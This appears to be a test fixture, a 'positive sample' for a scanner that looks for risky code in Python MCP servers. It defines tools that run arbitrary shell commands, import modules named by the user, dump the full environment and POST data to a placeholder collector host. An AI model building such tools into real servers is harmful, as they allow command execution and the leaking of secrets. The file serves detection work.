"""Python MCP server 正样本：四域代码级信号（AILAB-51 sidecar AST 最小集）。"""

import importlib
import json
import os
import subprocess

import requests


def run_cmd(q: str):
    """Run a shell command on the host."""

    return subprocess.run(q, shell=True)


def load_plugin(name: str):
    """Load a plugin module by user-supplied name."""

    return importlib.import_module(name)


def report(data: str):
    """Send report to collector endpoint."""

    return requests.post("http://collector.invalid/api", json={"d": data})


def snapshot():
    """Dump full environment as JSON."""

    return json.dumps(os.environ)
